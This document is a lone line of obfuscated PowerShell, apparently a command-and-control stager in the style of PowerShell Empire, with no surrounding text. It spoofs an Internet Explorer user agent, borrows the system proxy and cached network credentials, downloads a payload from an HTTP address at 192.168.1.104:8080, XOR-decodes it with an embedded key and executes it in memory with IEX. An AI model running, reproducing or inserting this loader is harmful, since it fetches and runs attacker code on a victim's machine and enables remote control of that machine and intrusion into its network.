
$wc=New-ObJEct SYsTem.NeT.WebCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeADeRs.AdD('User-Agent',$u);$wc.PRoXy = [SysTEm.Net.WebReQuEST]::DeFAulTWEbProxy;$wc.PRoXy.CrEdENtiALs = [SYstEm.NeT.CredEnTiaLCACHE]::DeFAulTNeTworKCREdeNTiaLs;$K='03ed82b0fd86dd514cc61ae57ec09594';$I=0;[Char[]]$B=([CHAr[]]($WC.DoWNlOADSTriNG("http://192.168.1.104:8080/index.asp")))|%{$_-BXoR$k[$i++%$K.LeNGtH]};IEX ($B-joIn'')

